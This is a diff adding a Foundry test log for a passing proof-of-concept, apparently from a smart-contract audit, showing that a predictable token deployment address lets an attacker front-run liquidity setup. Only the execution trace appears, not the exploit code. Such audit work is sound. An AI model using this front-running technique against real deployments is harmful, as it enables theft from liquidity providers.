@@ -1,0 +1,24 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/57870-h-03-predictable-token-deployment-address-enables-liquidity_exp.sol:PoC_57870
+[PASS] test_exploit() (gas: 591280)
+Traces:
+  [591280] PoC_57870::test_exploit()
+    ├─ [358591] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1791 bytes of code
+    ├─ [199637] Exploit::run()
+    │   ├─ [118563] → new DaosLive@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 592 bytes of code
+    │   ├─ [23253] DaosLive::finalize()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x000000000000000000000000b2db8153befb9d8380df70c26c8a16dc2c227f21
+    │   │   └─ ← [Return] 0xB2Db8153bEFb9d8380Df70c26c8A16dc2C227F21
+    │   ├─ emit Proof(frontRun: true)
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 257
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 346.96µs (187.88µs CPU time)
+
+Ran 1 test suite in 5.02ms (346.96µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
